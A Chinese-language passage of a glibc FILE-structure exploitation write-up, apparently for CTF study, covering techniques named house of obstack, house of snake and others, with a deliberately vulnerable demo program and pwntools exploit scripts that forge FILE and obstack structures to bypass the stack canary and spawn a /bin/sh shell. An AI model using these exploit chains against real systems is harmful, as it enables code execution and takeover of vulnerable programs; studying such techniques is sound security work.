此时，此时我们依然有这四个执行流程 1. _IO_SYSSTAT(fp, &amp;st)调用虚表，传入栈指针 2. decide_maybe_mmap函数结束，恢复两个虚表 3. _IO_UNDERFLOW (fp)调用虚表 4. _IO_WUNDERFLOW (fp)调用虚表
不同的是，此时_IO_SYSSTAT(fp, &amp;st)可以被指向任意的虚表函数，因为在第二次控制fp的时候，我们又一次覆写了FILE的vtable
那么此时我们就可以控制 _IO_SYSSTAT(fp, &amp;st) -&gt; _IO_new_file_read(fp, &amp;st, rdx) 我们已经成功完成了栈溢出
很不幸，decide_maybe_mmap函数开启了canary，我们没办法在没有泄露栈的情况下，完成栈溢出
由于fileno的设置，无法完成write(1,stack,rdx)的操作，真的没有办法的了吗
那么接下来，有请_IO_default_xsputn和_IO_default_xsgetn
我们阅读这两个函数源码 size_t  _IO_default_xsgetn (FILE *fp, void *data, size_t n)  &#123;    size_t more = n;    char *s = (char*) data;    for (;;)      &#123;        /* Data available. */        if (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)  	&#123;  	  size_t count = fp-&gt;_IO_read_end - fp-&gt;_IO_read_ptr;  	  if (count &gt; more)  	    count = more;  	  if (count &gt; 20)  	    &#123;  	      s = __mempcpy (s, fp-&gt;_IO_read_ptr, count);  	      fp-&gt;_IO_read_ptr += count;  	    &#125;  	  else if (count)  	    &#123;  	      char *p = fp-&gt;_IO_read_ptr;  	      int i = (int) count;  	      while (--i &gt;= 0)  		*s++ = *p++;  	      fp-&gt;_IO_read_ptr = p;  	    &#125;  	    more -= count;  	&#125;        if (more == 0 || __underflow (fp) == EOF)  	break;      &#125;    return n - more;  &#125;      size_t  _IO_default_xsputn (FILE *f, const void *data, size_t n)  &#123;    const char *s = (char *) data;    size_t more = n;    if (more &lt;= 0)      return 0;    for (;;)      &#123;        /* Space available. */        if (f-&gt;_IO_write_ptr &lt; f-&gt;_IO_write_end)  	&#123;  	  size_t count = f-&gt;_IO_write_end - f-&gt;_IO_write_ptr;  	  if (count &gt; more)  	    count = more;  	  if (count &gt; 20)  	    &#123;  	      f-&gt;_IO_write_ptr = __mempcpy (f-&gt;_IO_write_ptr, s, count);  	      s += count;  	    &#125;  	  else if (count)  	    &#123;  	      char *p = f-&gt;_IO_write_ptr;  	      ssize_t i;  	      for (i = count; --i &gt;= 0; )  		*p++ = *s++;  	      f-&gt;_IO_write_ptr = p;  	    &#125;  	  more -= count;  	&#125;        if (more == 0 || _IO_OVERFLOW (f, (unsigned char) *s++) == EOF)  	break;        more--;      &#125;    return n - more;  &#125;
可以知道，这是对于fp内的缓冲区的操作，可以关注到的是这里函数内有两个关键的部分 _IO_default_xsgetn (FILE *fp, void *data, size_t n)       ==&gt; __mempcpy(data, fp-&gt;_IO_read_ptr, n);  _IO_default_xsputn (FILE *f, const void *data, size_t n)       ==&gt; __mempcpy (f-&gt;_IO_write_ptr, data, n); 如果能够保证 fp-&gt;_IO_read_end - fp-&gt;_IO_read_ptr == n  f-&gt;_IO_write_end - f-&gt;_IO_write_ptr == n 就不会进入__underflow和_IO_OVERFLOW降低其他函数的干扰
这个时候就能衍生出一个大胆的想法，如果我们先将栈复制一份到可控的区域，再通过偏移写入，最后再拷贝回到栈内，那么我们就能完美的绕过canary并且，并不需要泄露canary
[[./houseofsome2.png]]
demo.c // gcc demo.c -o demo  #include&lt;stdio.h&gt;    int main()&#123;      setbuf(stdin, 0);      setbuf(stdout, 0);      setbuf(stderr, 0);      int c;      printf(&quot;[+] printf: %p\n&quot;, &amp;printf);      while (1) &#123;          puts(              &quot;1. add heap.\n&quot;              &quot;2. write libc.\n&quot;              &quot;3. exit&quot;);              printf(&quot;&gt; &quot;          );          scanf(&quot;%d&quot;, &amp;c);          if(c == 1) &#123;              int size;              printf(&quot;size&gt; &quot;);              scanf(&quot;%d&quot;, &amp;size);              char *p = malloc(size);              printf(&quot;[+] done %p\n&quot;, p);              printf(&quot;content&gt; &quot;);              read(0, p, size);          &#125; else if(c == 2)&#123;              size_t addr, size;              printf(&quot;size&gt; &quot;);              scanf(&quot;%lld&quot;, &amp;size);              printf(&quot;addr&gt; &quot;);              scanf(&quot;%lld&quot;, &amp;addr);              printf(&quot;content&gt; &quot;);              read(0, (char*)addr, size);          &#125; else &#123;              break;          &#125;      &#125;  &#125;
exp from pwn import *  context.log_level = &#x27;debug&#x27;  context.arch = &#x27;amd64&#x27;    tob = lambda x: str(x).encode()  io = process(&quot;./demo&quot;)    io.recvuntil(b&quot;[+] printf: &quot;)  printf_addr = int(io.recvuntil(b&quot;\n&quot;, drop=True), 16)  log.success(f&quot;printf_addr: &#123;printf_addr:#x&#125;&quot;)    def add(size):      io.sendlineafter(b&quot;&gt; &quot;, b&quot;1&quot;)      io.sendlineafter(b&quot;size&gt; &quot;, tob(size))        def write(addr, size, content):      io.sendlineafter(b&quot;&gt; &quot;, b&quot;2&quot;)      io.sendlineafter(b&quot;size&gt; &quot;, tob(size))      io.sendlineafter(b&quot;addr&gt; &quot;, tob(addr))      io.sendafter(b&quot;content&gt; &quot;, content)    def leave():      io.sendlineafter(b&quot;&gt; &quot;, b&quot;3&quot;)    libc = ELF(&quot;./libc.so.6&quot;, checksec=False)  libc_base = printf_addr - libc.symbols[&quot;printf&quot;]  libc.address = libc_base  log.success(f&quot;libc_base: &#123;libc_base:#x&#125;&quot;)    _IO_wfile_jumps_maybe_mmap = libc.address + 0x215f40  log.success(f&quot;_IO_wfile_jumps_maybe_mmap: &#123;_IO_wfile_jumps_maybe_mmap:#&#125;&quot;)  _IO_str_jumps = libc.address + 0x2166c0  log.success(f&quot;_IO_str_jumps: &#123;_IO_str_jumps:#&#125;&quot;)  _IO_default_xsputn = _IO_str_jumps + 0x38  _IO_default_xsgetn = _IO_str_jumps + 0x40    # 此处直接修改_IO_2_1_stdout_内容  write(libc.symbols[&quot;_IO_2_1_stdout_&quot;], 0xe0, flat(&#123;      0x0: 0x8000, # disable lock      0x38: libc.symbols[&quot;_IO_2_1_stdout_&quot;], # _IO_buf_base      0x40: libc.symbols[&quot;_IO_2_1_stdout_&quot;] + 0x1c8, # _IO_buf_end      0x70: 0, # _fileno      0xa0: libc.symbols[&quot;_IO_2_1_stdout_&quot;] + 0x100, # +0xe0可写即可      0xc0: p32(0xffffffff), # _mode &lt; 0      0xd8: _IO_wfile_jumps_maybe_mmap - 0x18,  &#125;, filler=b&quot;\x00&quot;))    # 拷贝栈上数据到可控地址，这里拷贝到_IO_2_1_stdout_的上方，方便下次写入顺便完成fp第三次控制  io.send(flat(&#123;      0x8: libc.symbols[&quot;_IO_2_1_stdout_&quot;], # 需要可写地址            0x38: libc.symbols[&quot;_IO_2_1_stdout_&quot;] - 0x1c8 + 0xc8, # _IO_buf_base      0x40: libc.symbols[&quot;_IO_2_1_stdout_&quot;] + 0x1c8, # _IO_buf_end      0xa0: libc.symbols[&quot;_IO_2_1_stdout_&quot;] + 0xe0,         0xc0: p32(0xffffffff),            0xd8: _IO_default_xsputn - 0x90, # vtable      0x28: libc.symbols[&quot;_IO_2_1_stdout_&quot;] - 0x1c8, # _IO_write_ptr      0x30: libc.symbols[&quot;_IO_2_1_stdout_&quot;], # _IO_write_end        0xe0: &#123;          0xe0: _IO_wfile_jumps_maybe_mmap      &#125;  &#125;, filler=b&quot;\x00&quot;))    # 最后这里就可以劫持执行流到0xdeadbeaf了  io.send(flat(&#123;      0: 0xdeadbeaf, # retn      0x1c8-0xc8: &#123;          0x38: libc.symbols[&quot;_IO_2_1_stdout_&quot;] - 0x1c8 + 0xc8, # _IO_buf_base          0x40: libc.symbols[&quot;_IO_2_1_stdout_&quot;] + 0x1c8, # _IO_buf_end          0xa0: libc.symbols[&quot;_IO_2_1_stdout_&quot;] + 0xe0,             0xc0: p32(0xffffffff),            0xd8: _IO_default_xsgetn - 0x90, # vtable          0x08: libc.symbols[&quot;_IO_2_1_stdout_&quot;] - 0x1c8, # _IO_read_ptr          0x10: libc.symbols[&quot;_IO_2_1_stdout_&quot;] + (0x1c8 - 0xc8), # _IO_read_end            0xe0: &#123;              0xe0: _IO_wfile_jumps_maybe_mmap          &#125;  &#125;  &#125;, filler=b&quot;\x00&quot;))    io.interactive()
house of 琴瑟琵琶 | house of obstack(2.34~2.36)
_IO_obstack_file结构体
struct _IO_obstack_file&#123;  struct _IO_FILE_plus file;  struct obstack *obstack;&#125;; struct obstack          /* control current object in current chunk */&#123;  long chunk_size;              /* preferred size to allocate chunks in */  struct _obstack_chunk *chunk; /* address of current struct obstack_chunk */  char *object_base;            /* address of object we are building */  char *next_free;              /* where to add next char to current object */  char *chunk_limit;            /* address of char after current chunk */  union  &#123;    PTR_INT_TYPE tempint;    void *tempptr;  &#125; temp;                       /* Temporary for some macros.  */  int alignment_mask;           /* Mask of alignment for each object. */  /* These prototypes vary based on &#x27;use_extra_arg&#x27;, and we use     casts to the prototypeless function type in all assignments,     but having prototypes here quiets -Wstrict-prototypes.  */  struct _obstack_chunk *(*chunkfun) (void *, long);  void (*freefun) (void *, struct _obstack_chunk *);  void *extra_arg;              /* first arg for chunk alloc/dealloc funcs */  unsigned use_extra_arg : 1;     /* chunk alloc/dealloc funcs take extra arg */  unsigned maybe_empty_object : 1; /* There is a possibility that the current                      chunk contains a zero-length object.  This                      prevents freeing the chunk if we allocate                      a bigger chunk to replace it. */  unsigned alloc_failed : 1;      /* No longer used, as we now call the failed                     handler on error, but retained for binary                     compatibility.  */&#125;;
_IO_obstack_overflow

调用链


_IO_obstack_overflow static int _IO_obstack_overflow (FILE *fp, int c)&#123;  struct obstack *obstack = ((struct _IO_obstack_file *) fp)-&gt;obstack;  int size;   /* Make room for another character.  This might as well allocate a     new chunk a memory and moves the old contents over.  */  assert (c != EOF);  // 此处不可控  obstack_1grow (obstack, c);   /* Setup the buffer pointers again.  */  fp-&gt;_IO_write_base = obstack_base (obstack);  fp-&gt;_IO_write_ptr = obstack_next_free (obstack);  size = obstack_room (obstack);  fp-&gt;_IO_write_end = fp-&gt;_IO_write_ptr + size;  /* Now allocate the rest of the current chunk.  */  obstack_blank_fast (obstack, size);   return c;&#125;
obstack_1grow (obstack, c)
_obstack_newchunk (__o, 1)
new_chunk = CALL_CHUNKFUN (h, new_size)
(*(h)-&gt;chunkfun)((h)-&gt;extra_arg, (size))

_IO_obstack_xsputn(优先选择)

调用链


_IO_obstack_xsputn static size_t _IO_obstack_xsputn (FILE *fp, const void *data, size_t n)&#123;  struct obstack *obstack = ((struct _IO_obstack_file *) fp)-&gt;obstack;   if (fp-&gt;_IO_write_ptr + n &gt; fp-&gt;_IO_write_end)    &#123;      int size;       /* We need some more memory.  First shrink the buffer to the     space we really currently need.  */      obstack_blank_fast (obstack, fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_end);       /* Now grow for N bytes, and put the data there.  */      obstack_grow (obstack, data, n); //执行此函数       /* Setup the buffer pointers again.  */      fp-&gt;_IO_write_base = obstack_base (obstack);      fp-&gt;_IO_write_ptr = obstack_next_free (obstack);      size = obstack_room (obstack);      fp-&gt;_IO_write_end = fp-&gt;_IO_write_ptr + size;      /* Now allocate the rest of the current chunk.  */      obstack_blank_fast (obstack, size);    &#125;  else    fp-&gt;_IO_write_ptr = __mempcpy (fp-&gt;_IO_write_ptr, data, n);   return n;&#125;
obstack_grow (obstack, data, n)         obstack_grow(obstack, data, n);定义:  # define obstack_grow(OBSTACK, where, length)				      \  __extension__								      \    (&#123; struct obstack *__o = (OBSTACK);					      \       int __len = (length);						      \       if (__o-&gt;next_free + __len &gt; __o-&gt;chunk_limit)			      \	 _obstack_newchunk (__o, __len);				      \       memcpy (__o-&gt;next_free, where, __len);				      \       __o-&gt;next_free += __len;						      \       (void) 0; &#125;) 替换:          (&#123;            struct obstack *__o = (obstack);            int __len = (n);            if (__o-&gt;next_free + __len &gt; __o-&gt;chunk_limit)_obstack_newchunk(__o, __len);            memcpy(__o-&gt;next_free, data, __len);            __o-&gt;next_free += __len;            (void) 0;        &#125;);
_obstack_newchunk (__o, __len) void _obstack_newchunk(struct obstack *h, int length) &#123;    struct _obstack_chunk *old_chunk = h-&gt;chunk;    struct _obstack_chunk *new_chunk;    long new_size;    long obj_size = h-&gt;next_free - h-&gt;object_base;    long i;    long already;    char *object_base;    /* Compute size for new chunk.  */    new_size = (obj_size + length) + (obj_size &gt;&gt; 3) + h-&gt;alignment_mask + 100;    if (new_size &lt; h-&gt;chunk_size)        new_size = h-&gt;chunk_size;    /* Allocate and initialize the new chunk.  */    new_chunk = CALL_CHUNKFUN(h, new_size); // 调用函数位置    ...&#125; 
new_chunk = CALL_CHUNKFUN (h, new_size) new_chunk = CALL_CHUNKFUN(h, new_size);定义:  #define CALL_CHUNKFUN(h, size)                          \    (((h)-&gt;use_extra_arg)                               \             ? (*(h)-&gt;chunkfun)((h)-&gt;extra_arg, (size)) \             : (*(struct _obstack_chunk * (*) (long) )(h)-&gt;chunkfun)((size)))替换:  (((h)-&gt;use_extra_arg) ? (*(h)-&gt;chunkfun)((h)-&gt;extra_arg, (new_size)) : (*(struct _obstack_chunk *(*) (long) )(h)-&gt;chunkfun)((new_size))) 第一个参数可控，同时需要保证(((h)-&gt;use_extra_arg)为1
(*(h)-&gt;chunkfun)((h)-&gt;extra_arg, (size))

[[./houseofobstack1.png]]
exp如下 fake_io_addr = heap_addr + 0x1390obstack_ptr = fake_io_addr + 0x30fake_io_file = b&#x27;&#x27;fake_io_file = fake_io_file.ljust(0x58,b&#x27;\x00&#x27;)fake_io_file += p64(system_addr)  # 需要执行的函数fake_io_file += p64(0)fake_io_file += p64(fake_io_addr+0xe8)  # 执行函数的 rdifake_io_file += p64(1)  # obstack-&gt;use_extra_arg=1fake_io_file += p64(heap_addr+0x2000)  # _IO_lock_t *_lock;fake_io_file = fake_io_file.ljust(0xc8,b&#x27;\x00&#x27;)fake_io_file += p64(IO_obstack_jumps_addr + 0x20)  # 触发 _IO_obstack_xsputn;fake_io_file += p64(obstack_ptr)  # struct obstack *obstackprint(hex(len(fake_io_file))) # 因为是largebin attack 所以: 0xd8=0xe8-0x10# pause() # 执行函数的 rdi 的地址所存储的内容payload = fake_io_file+ b&#x27;/bin/sh\x00&#x27;
house of snake(house of obstack plus)
在libc-2.37后由house of obstack转换为house of snake 删除了 _IO_obstack_jumps 但是添加了 _IO_printf_buffer_as_file_jumps 这个新的 _IO_jumps_t 结构体 static const struct _IO_jump_t _IO_printf_buffer_as_file_jumps libio_vtable =&#123;  JUMP_INIT_DUMMY,  JUMP_INIT(finish, NULL),  JUMP_INIT(overflow, __printf_buffer_as_file_overflow),  JUMP_INIT(underflow, NULL),  JUMP_INIT(uflow, NULL),  JUMP_INIT(pbackfail, NULL),  JUMP_INIT(xsputn, __printf_buffer_as_file_xsputn),  JUMP_INIT(xsgetn, NULL),  JUMP_INIT(seekoff, NULL),  JUMP_INIT(seekpos, NULL),  JUMP_INIT(setbuf, NULL),  JUMP_INIT(sync, NULL),  JUMP_INIT(doallocate, NULL),  JUMP_INIT(read, NULL),  JUMP_INIT(write, NULL),  JUMP_INIT(seek, NULL),  JUMP_INIT(close, NULL),  JUMP_INIT(stat, NULL),  JUMP_INIT(showmanyc, NULL),  JUMP_INIT(imbue, NULL)&#125;; 其中__printf_buffer_as_file_overflow 函数定义如下： static inline bool __attribute_warn_unused_result____printf_buffer_has_failed(struct __printf_buffer *buf) &#123;    return buf-&gt;mode == __printf_buffer_mode_failed;&#125;static int__printf_buffer_as_file_overflow(FILE *fp, int ch) &#123;    struct __printf_buffer_as_file *file = (struct __printf_buffer_as_file *) fp;    __printf_buffer_as_file_commit(file);    /* EOF means only a flush is requested.   */    if (ch != EOF)        __printf_buffer_putc(file-&gt;next, ch);    /* Ensure that flushing actually produces room.  */    if (!__printf_buffer_has_failed(file-&gt;next)        &amp;&amp; file-&gt;next-&gt;write_ptr == file-&gt;next-&gt;write_end)        __printf_buffer_flush(file-&gt;next);	...&#125; 首先 __printf_buffer_as_file_overflow 函数将 FILE 结构体转换为 __printf_buffer_as_file 类型，相关定义如下： struct __printf_buffer&#123;  char *write_base;  char *write_ptr;  char *write_end;  uint64_t written;  enum __printf_buffer_mode mode;&#125;;struct __printf_buffer_as_file&#123;  /* Interface to libio.  */  FILE stream;  const struct _IO_jump_t *vtable;  /* Pointer to the underlying buffer.  */  struct __printf_buffer *next;&#125;; 之后调用了 __printf_buffer_as_file_commit ，该函数做了一些检查： static void__printf_buffer_as_file_commit (struct __printf_buffer_as_file *file)&#123;  /* Check that the write pointers in the file stream are consistent     with the next buffer.  */  assert (file-&gt;stream._IO_write_ptr &gt;= file-&gt;next-&gt;write_ptr);  assert (file-&gt;stream._IO_write_ptr &lt;= file-&gt;next-&gt;write_end);  assert (file-&gt;stream._IO_write_base == file-&gt;next-&gt;write_base);  assert (file-&gt;stream._IO_write_end == file-&gt;next-&gt;write_end);  file-&gt;next-&gt;write_ptr = file-&gt;stream._IO_write_ptr;&#125; 之后根据参数ch是否为EOF决定是否调用 __printf_buffer_putc ，FSOP中调用的_IO_flush_all_lockp函数中是通过_IO_OVERFLOW (fp, EOF)调用到vtable中的overflow函数，因此__printf_buffer_as_file_overflow的参数ch为EOF， 当然，即使调用到了__printf_buffer_putc也只是是做了一些指针记录的数值加减的操作，对此我们不用过多关注
再之后会调用__printf_buffer_flush函数，调用条件是file-&gt;next.mode != __printf_buffer_mode_failed且file-&gt;next-&gt;write_ptr == file-&gt;next-&gt;write_end
__printf_buffer_flush函数定义如下，这里再次检查file-&gt;next.mode != __printf_buffer_mode_failed然后调用__printf_buffer_do_flush函数，参数为file-&gt;next
#define Xprintf(n) __printf_##n#define Xprintf_buffer_flush Xprintf (buffer_flush)#define Xprintf_buffer Xprintf (buffer)boolXprintf_buffer_flush (struct Xprintf_buffer *buf)&#123;  if (__glibc_unlikely (Xprintf_buffer_has_failed (buf)))    return false;  Xprintf (buffer_do_flush) (buf); // __printf_buffer_do_flush(buf)  ...&#125;
如果 file-&gt;next.mode = __printf_buffer_mode_obstack(11) 那么会调用 __printf_buffer_flush_obstack 函数 static void__printf_buffer_do_flush (struct __printf_buffer *buf)&#123;  switch (buf-&gt;mode)    &#123;    ...    case __printf_buffer_mode_obstack:      __printf_buffer_flush_obstack ((struct __printf_buffer_obstack *) buf);      return;    &#125;  ...&#125; __printf_buffer_obstack 结构体定义如下： struct __printf_buffer_obstack&#123;  struct __printf_buffer base;  struct obstack *obstack;  char ch;&#125;; 如果满足 buf-&gt;base.write_ptr == &amp;buf-&gt;ch + 1 则 __printf_buffer_flush_obstack 会执行 obstack_1grow 宏 void__printf_buffer_flush_obstack (struct __printf_buffer_obstack *buf)&#123;  ...  if (buf-&gt;base.write_ptr == &amp;buf-&gt;ch + 1)    &#123;      obstack_1grow (buf-&gt;obstack, buf-&gt;ch);      ...    &#125;    ...&#125; obstack_1grow 宏展开内容如下，可以看到该宏调用了 _obstack_newchunk 函数并将 buf-&gt;obstack 作为参数传入 声明位置: obstack.h  定义:  # define obstack_1grow(OBSTACK, datum)                          \  __extension__                                      \    (&#123; struct obstack *__o = (OBSTACK);                          \       if (__o-&gt;next_free + 1 &gt; __o-&gt;chunk_limit)                  \     _obstack_newchunk (__o, 1);                          \       obstack_1grow_fast (__o, datum);                          \       (void) 0; &#125;)替换:  (&#123;    struct obstack *__o = (buf-&gt;obstack);    if (__o-&gt;next_free + 1 &gt; __o-&gt;chunk_limit)_obstack_newchunk(__o, 1);    (*((__o)-&gt;next_free)++ = (buf-&gt;ch));    (void) 0;&#125;) _obstack_newchunk 函数会执行 CALL_CHUNKFUN 宏，这和前面的 House of 琴瑟琵琶利用链相同 void_obstack_newchunk (struct obstack *h, int length)&#123;  ...  struct _obstack_chunk *new_chunk;  ...  new_chunk = CALL_CHUNKFUN (h, new_size);  ...&#125; 综上所述： 1. 在__printf_buffer_as_file_overflow函数中： * file-&gt;next-&gt;mode!=__printf_buffer_mode_failed &amp;&amp; file-&gt;next-&gt;write_ptr == file-&gt;next-&gt;write_end 2. 在__printf_buffer_as_file_commit函数中： * file-&gt;stream._IO_write_ptr &gt;= file-&gt;next-&gt;write_ptr * file-&gt;stream._IO_write_ptr &lt;= file-&gt;next-&gt;write_end * file-&gt;stream._IO_write_base == file-&gt;next-&gt;write_base * file-&gt;stream._IO_write_end == file-&gt;next-&gt;write_end 3. 在__printf_buffer_flush函数中： * file-&gt;next-&gt;mode =__printf_buffer_mode_obstack 4. 在__printf_buffer_flush_obstack函数中： * buf-&gt;base.write_ptr == &amp;buf-&gt;ch + 1 &lt;==&gt; file-&gt;next.write_ptr == &amp;(file-&gt;next) + 0x30 + 1 5. 在obstack_1grow宏定义中： * (struct __printf_buffer_obstack *) file-&gt;obstack-&gt;next_free + 1 &gt; (struct __printf_buffer_obstack *) file-&gt;obstack-&gt;chunk_limit * (h)-&gt;use_extra_arg 不为 0 &lt;==&gt; (struct __printf_buffer_obstack *) file-&gt;obstack-&gt;use_extra_arg != 0 6. 最终调用(struct __printf_buffer_obstack *) file-&gt;obstack-&gt;chunkfun((struct __printf_buffer_obstack *) file-&gt;obstack-&gt;extra_arg) [[./houseofsnake1.png]]
house of 秦月汉关
因为puts函数在开始时候会调用strlen， 我们跟随puts函数找到真正的strlen。可以看出puts会调用strlen的PLT表，PLT表跳转到一个*ABS*@got.plt&gt;的地方，里面存储的才是真正的strlen函数地址，改写这个来getshell ### house of 魑魅魍魉 一般来说一类跳表只有一个，但_IO_helper_jumps比较特殊，通过下面可以看出，跳表会根据COMPILE_WPRINTF值不同而生成不同的，但可能libc在编译时调用两次，所以我们可以在内存中看到两个_IO_helper_jumps，每种各一个。其中COMPILE_WPRINTF == 0先生成，COMPILE_WPRINTF == 1后生成
#ifdef COMPILE_WPRINTFstatic const struct _IO_jump_t _IO_helper_jumps libio_vtable =&#123;  JUMP_INIT_DUMMY,  JUMP_INIT (finish, _IO_wdefault_finish),  JUMP_INIT (overflow, _IO_helper_overflow),  JUMP_INIT (underflow, _IO_default_underflow),  JUMP_INIT (uflow, _IO_default_uflow),  JUMP_INIT (pbackfail, (_IO_pbackfail_t) _IO_wdefault_pbackfail),  JUMP_INIT (xsputn, _IO_wdefault_xsputn),  JUMP_INIT (xsgetn, _IO_wdefault_xsgetn),  JUMP_INIT (seekoff, _IO_default_seekoff),  JUMP_INIT (seekpos, _IO_default_seekpos),  JUMP_INIT (setbuf, _IO_default_setbuf),  JUMP_INIT (sync, _IO_default_sync),  JUMP_INIT (doallocate, _IO_wdefault_doallocate),  JUMP_INIT (read, _IO_default_read),  JUMP_INIT (write, _IO_default_write),  JUMP_INIT (seek, _IO_default_seek),  JUMP_INIT (close, _IO_default_close),  JUMP_INIT (stat, _IO_default_stat)&#125;;#elsestatic const struct _IO_jump_t _IO_helper_jumps libio_vtable =&#123;  JUMP_INIT_DUMMY,  JUMP_INIT (finish, _IO_default_finish),  JUMP_INIT (overflow, _IO_helper_overflow),  JUMP_INIT (underflow, _IO_default_underflow),  JUMP_INIT (uflow, _IO_default_uflow),  JUMP_INIT (pbackfail, _IO_default_pbackfail),  JUMP_INIT (xsputn, _IO_default_xsputn),  JUMP_INIT (xsgetn, _IO_default_xsgetn),  JUMP_INIT (seekoff, _IO_default_seekoff),  JUMP_INIT (seekpos, _IO_default_seekpos),  JUMP_INIT (setbuf, _IO_default_setbuf),  JUMP_INIT (sync, _IO_default_sync),  JUMP_INIT (doallocate, _IO_default_doallocate),  JUMP_INIT (read, _IO_default_read),  JUMP_INIT (write, _IO_default_write),  JUMP_INIT (seek, _IO_default_seek),  JUMP_INIT (close, _IO_default_close),  JUMP_INIT (stat, _IO_default_stat)&#125;;#endif
同样，面对不同的COMPILE_WPRINTF所对应的helper_file也有所不同，区别在于是否需要伪造struct _IO_wide_data _wide_data;
struct helper_file  &#123;    struct _IO_FILE_plus _f;#ifdef COMPILE_WPRINTF    struct _IO_wide_data _wide_data;#endif    FILE *_put_stream;#ifdef _IO_MTSAFE_IO    _IO_lock_t lock;#endif  &#125;;
同样，_IO_helper_overflow这个函数在内存中也有 2 份。通过测试发现，如果使用COMPILE_WPRINTF == 0的情况，在攻击过程中s-&gt;_IO_write_base会变成largebin-&gt;fd_nextsize指针，从而被强制修改无法控制。为了方便，我们使用COMPILE_WPRINTF == 1所生成的_IO_helper_overflow。该函数在攻击过程中的作用是控制_IO_default_xsputn的三个参数
static int _IO_helper_overflow (FILE *s, int c)&#123;  FILE *target = ((struct helper_file*) s)-&gt;_put_stream;#ifdef COMPILE_WPRINTF  int used = s-&gt;_wide_data-&gt;_IO_write_ptr - s-&gt;_wide_data-&gt;_IO_write_base;  if (used)    &#123;      // 利用这个链，显然这三个参数我们都可控。      size_t written = _IO_sputn (target, s-&gt;_wide_data-&gt;_IO_write_base, used);      if (written == 0 || written == WEOF)    return WEOF;      __wmemmove (s-&gt;_wide_data-&gt;_IO_write_base,          s-&gt;_wide_data-&gt;_IO_write_base + written,          used - written);      s-&gt;_wide_data-&gt;_IO_write_ptr -= written;    &#125;#else    // 如果使用这条链，_IO_write_ptr 将处于 largebin 的 bk_size 指针处  int used = s-&gt;_IO_write_ptr - s-&gt;_IO_write_base;  if (used)    &#123;      size_t written = _IO_sputn (target, s-&gt;_IO_write_base, used);      if (written == 0 || written == EOF)    return EOF;      memmove (s-&gt;_IO_write_base, s-&gt;_IO_write_base + written,           used - written);      s-&gt;_IO_write_ptr -= written;    &#125;#endif  return PUTC (c, s);&#125;
通过上面函数可以清楚看出，在执行size_t written = _IO_sputn (target, s-&gt;_wide_data-&gt;_IO_write_base, used)时

FILE *target = ((struct helper_file*) s)-&gt;_put_stream可控
s-&gt;_wide_data-&gt;_IO_write_base可控
int used = s-&gt;_wide_data-&gt;_IO_write_ptr - s-&gt;_wide_data-&gt;_IO_write_base可控

就达成了3个参数可控的要求，然后通过修改((struct helper_file*) s)-&gt;_put_stream的vtable指向_IO_str_jumps，使其调用_IO_default_xsputn函数
需要注意的是，s-&gt;_wide_data-&gt;_IO_write_ptr和s-&gt;_wide_data-&gt;_IO_write_base是wchar_t *类型，也就是说used实际是(s-&gt;_wide_data-&gt;_IO_write_ptr - s-&gt;_wide_data-&gt;_IO_write_base) &gt;&gt; 2，（在 Linux 系统上，宽字符通常使用UTF-32编码表示，而UTF-32使用32位表示一个字符，因此wchar_t类型在Linux上通常为4字节）
_IO_default_xsputn 函数内要绕过的内容较多。该函数在攻击过程中的作用是两次调用 __mempcpy ，第一次利用任意地址写修改 __mempcpy 对应的 got 表中的值，第二次调用 __mempcpy 劫持程序执行流
size_t_IO_default_xsputn (FILE *f, const void *data, size_t n)&#123;  const char *s = (char *) data;  size_t more = n;  if (more &lt;= 0)    return 0;  for (;;)    &#123;      /* Space available. */      if (f-&gt;_IO_write_ptr &lt; f-&gt;_IO_write_end)    &#123;      size_t count = f-&gt;_IO_write_end - f-&gt;_IO_write_ptr;          // 要 more &gt; count，能再次返回执行 __mempcpy      if (count &gt; more)        count = more;          // 要 count &gt; 20      if (count &gt; 20)        &#123;          // 利用此处实现 house of 借刀杀人，          // 修改 memcpy 的内容为setcontext          // 再次返回的时候就能够实现 house of 一骑当千          f-&gt;_IO_write_ptr = __mempcpy (f-&gt;_IO_write_ptr, s, count);          s += count;        &#125;      else if (count)        &#123;          char *p = f-&gt;_IO_write_ptr;          ssize_t i;          for (i = count; --i &gt;= 0; )        *p++ = *s++;          f-&gt;_IO_write_ptr = p;        &#125;          // 要 more &gt; count，能再次返回执行 __mempcpy      more -= count;    &#125;      // 绕过下面这一行，再次执行for循环的内容      if (more == 0 || _IO_OVERFLOW (f, (unsigned char) *s++) == EOF)     break;      more--;    &#125;  return n - more;&#125;libc_hidden_def (_IO_default_xsputn)
需要绕过内容总结如下 * 需要more &gt; count，能再次返回执行__mempcpy，且要想再次返回执行memcpy，由于此时f-&gt;_IO_write_ptr被_IO_str_overflow函数修改为指向"/bin/sh"字符串，因此count = f-&gt;_IO_write_end - f-&gt;_IO_write_ptr可能为一个很大的值，导致count &gt; more，进而更新count为more，因此再次循环时要求more &gt; 20。由于上一次循环中依次执行了more -= count和more--语句，因此要求more ≥ count + 1 + 21 * 需要count &gt; 20，因此count至少为21
第一次执行__mempcpy (f-&gt;_IO_write_ptr, s, count);

_IO_write_ptr为__mempcpy表项
s为要写入的内容

再次执行__mempcpy (f-&gt;_IO_write_ptr, s, count)

需要绕过if (more == 0 || _IO_OVERFLOW (f, (unsigned char) *s++) == EOF)，具体绕过方式接下来会介绍
f-&gt;_IO_write_ptr为rdi,s为rsi，count为rdx

同样，执行_IO_str_overflow需要绕过内容也比较多。该函数的作用是控制fp-&gt;_IO_write_ptr，从而控制_IO_default_xsputn第二次循环中__mempcpy的第一个参数
